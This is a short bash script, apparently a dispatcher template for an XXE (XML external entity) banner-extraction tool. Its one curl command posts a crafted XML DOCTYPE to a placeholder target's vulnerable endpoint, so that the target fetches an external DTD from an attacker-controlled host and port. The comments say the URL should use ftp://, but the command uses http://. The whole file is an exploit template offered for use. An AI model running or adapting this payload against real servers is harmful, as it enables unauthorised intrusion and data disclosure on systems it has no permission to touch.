#!/bin/bash

#dispatcher template for banner extracion with xxe_bannerFTP.sh

host=${1:-dockerhost}
port=${2:-8080}
prefix=${3:-serveme}

set +H #turn off history expansion to freely use !

#CHANGE THE FOLLOWING LINES.
#The target server should be triggered to load DTDs from the following url: "ftp://${host}:${port}/${prefix}"
#the variables ${host} and ${port} will be populated by the script at runtime!
curl "https://target/xxe_vulnerability" -H 'Content-Type: application/xml' --data "<!DOCTYPE r SYSTEM \"http://${host}:${port}/${prefix}\"><r></r>"